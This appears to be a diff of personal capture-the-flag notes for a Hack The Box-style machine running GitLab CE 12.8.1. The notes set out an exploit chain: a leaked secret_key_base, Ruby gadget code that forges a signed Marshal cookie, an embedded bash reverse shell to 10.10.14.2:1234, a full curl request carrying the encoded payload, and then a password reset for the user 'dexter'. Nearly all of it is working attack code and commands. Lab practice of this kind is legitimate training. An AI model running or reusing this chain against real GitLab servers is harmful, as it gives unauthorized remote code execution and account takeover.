@@ -1,6 +1,26 @@
 git.laboratory.htb domain required in /etc/hosts
 gitlab community edition 12.8.1
+
 https://twitter.com/chvancooten/status/1270374330380230657
  1) arbitrary file read using link functionality and moving an issue between repos
  2) RCE when parsing cookies signed with secret key
+
 SECRET_KEY_BASE: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+edit /etc/gitlab.rb -> add gitlab_rails['secret_key_base'] = <LEAKED SECRET_KEY>
+
+run commands from hackerone in twitter in gitlab-rails console on running docker instance to get cookie payload
+
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+
+curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvMTIzNCAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--32d75224ca00abf503a49155bd7889d321117087"
+
+
+https://docs.gitlab.com/12.10/ee/security/reset_root_password.html <- USE THIS TO RESET PASSWORD OF username: 'dexter'
+ssh key found inside
